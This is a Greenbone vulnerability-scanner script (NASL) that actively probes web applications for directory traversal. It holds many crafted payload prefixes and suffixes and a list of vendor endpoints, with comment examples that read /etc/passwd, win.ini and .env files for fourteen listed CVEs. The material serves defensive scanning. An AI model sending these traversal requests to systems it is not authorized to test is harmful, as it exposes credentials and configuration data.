# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113002");
  script_version("2024-10-18T15:39:59+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-10-18 15:39:59 +0000 (Fri, 18 Oct 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-09-24 14:09:48 +0000 (Tue, 24 Sep 2024)");
  script_tag(name:"creation_date", value:"2017-09-26 10:00:00 +0200 (Tue, 26 Sep 2017)");

  # nb: Unlike other VTs we're using the CVEs line by line here for easier addition of new CVEs
  script_cve_id("CVE-2009-3151",
                "CVE-2018-14957",
                "CVE-2019-7254",
                "CVE-2024-10100",
                "CVE-2024-27292",
                "CVE-2024-3234",
                "CVE-2024-34470",
                "CVE-2024-36527",
                "CVE-2024-40422",
                "CVE-2024-45241",
                "CVE-2024-5334",
                "CVE-2024-5926",
                "CVE-2024-6911",
                "CVE-2024-7928");

  script_name("Generic HTTP Directory Traversal (Web Application URL Parameter) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning",
                      "global_settings/disable_generic_webapp_scanning");

  script_xref(name:"URL", value:"https://owasp.org/www-community/attacks/Path_Traversal");

  script_tag(name:"summary", value:"Generic check for HTTP directory traversal vulnerabilities
  within URL parameters of the remote web application.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an attacker to
  access paths and directories that should normally not be accessible by a user. This can result in
  effects ranging from disclosure of confidential information to arbitrary code execution.");

  script_tag(name:"affected", value:"The following products are known to be affected by the pattern
  and URL parameters checked in this VT:

  - No CVEs: Sharp Multi-Function Printers, Leadsec VPN, Ncast, UniSharp Laravel File Manager prior
  to version 2.2.0, FastBee, Nsfocus, Motic Digital Slide Management System

  - CVE-2009-3151: Ultrize TimeSheet 1.2.2

  - CVE-2018-14957: CMS ISWEB 3.5.3

  - CVE-2019-7254: Linear eMerge E3-Series

  - CVE-2024-10100: binary-husky/gpt_academic version 3.83

  - CVE-2024-27292: Docassemble 1.4.53 through 1.4.96

  - CVE-2024-3234: gaizhenbiao/chuanhuchatgpt prior to version 20240305

  - CVE-2024-34470: HSC Mailinspector 5.2.17-3 through v.5.2.18

  - CVE-2024-36527: puppeteer-renderer prior to version 3.3.0

  - CVE-2024-40422, CVE-2024-5334, CVE-2024-5926: stitionai/devika

  - CVE-2024-45241: CentralSquare CryWolf

  - CVE-2024-6911: PerkinElmer ProcessPlus

  - CVE-2024-7928: FastAdmin

  Other products might be affected as well.");

  script_tag(name:"vuldetect", value:"Sends various crafted HTTP requests to previously spidered URL
  parameters (e.g. /index.php?parameter=directory_traversal) of a web application and checks the
  responses.

  Note: Due to the long expected run time of this VT it is currently not enabled / running by
  default. Please set the 'Enable generic web application scanning' setting within the VT
  'Global variable settings' (OID: 1.3.6.1.4.1.25623.1.0.12288) to 'yes' if you want to run this
  script.");

  script_tag(name:"solution", value:"Contact the vendor for a solution.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_timeout(900);

  exit(0);
}

# nb: We also don't want to run if optimize_test is set to "no"
if( get_kb_item( "global_settings/disable_generic_webapp_scanning" ) )
  exit( 0 );

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");
include("list_array_func.inc");

# nb:
# - Prints out the "final" URLs below
# - In that print out a `log_message()` is used as `display()` is having problem because it would interpret e.g. `\e` wrongly.
debug = FALSE;

depth = get_kb_item( "global_settings/dir_traversal_depth" );
traversals = traversal_pattern( extra_pattern_list:make_list( "/" ), depth:depth );
files = traversal_files();
count = 0;
max_count = 3;

# nb: Keep the "suffixes", "prefixes" and "file_path_variants" lists in sync with the ones in the
# following:
#
# - 2017/gb_generic_http_web_root_dir_trav.nasl
# - 2021/gb_generic_http_web_dirs_dir_trav.nasl
#
suffixes = make_list(
  "",
  "/",            # Oracle GlassFish Server flaw (CVE-2017-1000029) but other environments / technologies might be affected as well
  "%00index.htm", # Kyocera Printer flaws (CVE-2020-23575, CVE-2023-34259) but other environments / technologies might be affected as well
  "%23vt/test",   # Spring Cloud Config flaw (CVE-2020-5410) but other environments / technologies might be affected as well
  "%00" );        # PHP < 5.3.4 but other environments / technologies might be affected as well

prefixes = make_list(
  "",
  "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F", # See e.g. https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2024-4956
  "%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C", # Reverse case for the one above
  "//////",                                     # See e.g. https://medium.com/appsflyerengineering/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
  "\\\\\\",                                     # Reverse case for the one above
  "/%5c",                                       # CVE-2022-27043, see e.g. https://github.com/jimdx/YEARNING-CVE-2022-27043/blob/main/README.md
  "/%2f",                                       # Reverse case for the one above
  "static//////",                               # From https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
  "static\\\\\\",                               # Reverse case for the one above
  "file%3a//",                                  # Oracle GlassFish Server flaw (CVE-2017-1000029) but other environments / technologies might be affected as well
  "file://",                                    # puppeteer-renderer (CVE-2024-36527) but other environments / technologies might be affected as well
  "c:" );                                       # Seen for Pallets Werkzeug (CVE-2019-14322) on a specific directory but other environments / technologies might be affected in a similar way so it was also added here

file_path_variants = make_list(
  "plain", # nb: Just e.g. "etc/passwd" or "windows/win.ini" as returned by traversal_files()
  "%2f",
  "\",
  "%5c" );

port = http_get_port( default:80 );

host = http_host_name( dont_add_port:TRUE );
if( ! cgis = http_get_kb_cgis( port:port, host:host ) )
  cgis = make_list();

# nb: Syntax of the entries below is described in the http_get_kb_cgis() function description.
cgis = make_list_unique( cgis,
  "/mailinspector/public/loader.php - path []",                    # CVE-2024-34470 -> /mailinspector/public/loader.php?path=../../../../../../../etc/passwd
  "/html - url []",                                                # CVE-2024-36527 -> /html?url=file:///etc/passwd
  "/index/ajax/lang - lang []",                                    # FastAdmin/CVE-2024-7928 -> /index/ajax/lang?lang=..//..//..//..//..//..//etc/passwd or /index/ajax/lang?lang=../../application/database
  "/api/get-browser-snapshot - snapshot_path []",                  # CVE-2024-5334 -> /api/get-browser-snapshot?snapshot_path=/etc/passwd and CVE-2024-40422 -> /api/get-browser-snapshot?snapshot_path=../../../../etc/passwd
  "/api/get-project-files/ - project_name []",                     # CVE-2024-5926 -> /api/get-project-files/?project_name=../../../../../../../../../../../../etc/passwd
  "/interview - i []",                                             # CVE-2024-27292 -> /interview?i=/etc/passwd
  "/installed_emanual_down.html - path [/manual/]",                # Sharp MFP -> /installed_emanual_down.html?path=/manual/../../../etc/passwd
  "/vpn/user/download/client - ostype []",                         # Leadsec VPN -> /vpn/user/download/client?ostype=../../../../../../../../../etc/passwd
  "/developLog/downloadLog.php - name []",                         # Ncast -> /developLog/downloadLog.php?name=../../../../etc/passwd
  "/actions/downloadFile.php - fileName []",                       # CVE-2009-3151 -> /actions/downloadFile.php?fileName=../../../<somefile>
  "/moduli/downloadFile.php - file [oggetto_documenti/]",          # CVE-2018-14957 -> /moduli/downloadFile.php?file=oggetto_documenti/../.././<somefile>
  "/laravel-filemanager/download?working_dir=%2F&type= - file []", # Laravel File Manager < 2.2.0 (https://github.com/UniSharp/laravel-filemanager/issues/944) -> /laravel-filemanager/download?working_dir=%2F&type=&file=../../../../.env
  "/ProcessPlus/Log/Download/ - filename []",                      # CVE-2024-6911 -> /ProcessPlus/Log/Download/?filename=..\..\..\..\..\..\Windows\win.ini
  "/GeneralDocs.aspx - rpt []",                                    # CVE-2024-45241 -> /GeneralDocs.aspx?rpt=../../../../Windows/win.ini
  "/prod-api/iot/tool/download - fileName []",                     # FastBee -> /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd
  "/webconf/GetFile/index - path []",                              # Nsfocus -> /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
  "/UploadService/Page/style - f []",                              # Motic -> /UploadService/Page/style?f=c:\windows\win.ini
  "/ - file [web_assets/]",                                        # CVE-2024-3234 -> /file=web_assets/../config.json
  "/ - file []",                                                   # CVE-2024-10100 -> /file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
  "/ - c []" );                                                    # CVE-2019-7254 -> /?c=../../../../../../etc/passwd%00

foreach cgi( cgis ) {

  cgiArray = split( cgi, sep:" ", keep:FALSE );
  cgi_vuln = FALSE; # nb: Used later to only report each URL only once

  foreach traversal( traversals ) {

    foreach pattern( keys( files ) ) {

      file = files[pattern];

      foreach suffix( suffixes ) {

        foreach prefix( prefixes ) {

          foreach file_path_variant( file_path_variants ) {

            # nb: Only do modification to the file if any encoding variant has been requested
            if( file_path_variant != "plain" ) {

              # nb: No slash so just continue as this is already covered in the "plain" variant
              if( "/" >!< file )
                continue;

              check_file = str_replace( string:file, find:"/", replace:file_path_variant );

            } else {
              check_file = file;
            }

            exp = prefix + traversal + check_file + suffix;
            urls = http_create_exploit_req( cgiArray:cgiArray, ex:exp );

            foreach url( urls ) {

              if( debug ) log_message( data:url );

              req = http_get( port:port, item:url );
              res = http_keepalive_send_recv( port:port, data:req );

              if( egrep( pattern:pattern, string:res, icase:TRUE ) ) {
                count++;
                cgi_vuln = TRUE;
                vuln += http_report_vuln_url( port:port, url:url ) + '\n\n';
                vuln += 'Request:\n' + chomp( req ) + '\n\nResponse:\n' + chomp( res ) + '\n\n\n';
                break; # Don't report multiple vulnerable parameter / pattern / suffixes / prefixes for the very same URL
              }
            }
            if( count >= max_count || cgi_vuln )
              break; # nb: No need to continue with that much findings or with multiple vulnerable parameter / pattern / suffixes / prefixes for the very same URL
          }
          if( count >= max_count || cgi_vuln )
            break;
        }
        if( count >= max_count || cgi_vuln )
          break;
      }
      if( count >= max_count || cgi_vuln )
        break;
    }
    if( count >= max_count || cgi_vuln )
      break;
  }
  if( count >= max_count )
    break;
}

if( vuln ) {
  report = 'The following affected URL(s) were found (limited to ' + max_count + ' results):\n\n' + chomp( vuln );
  security_message( port:port, data:report );
  exit( 0 );
}

# nb: No "exit(99)" as the system might be still affected by one or more attached CVE(s) but just no
# HTTP service is exposed
exit( 0 );
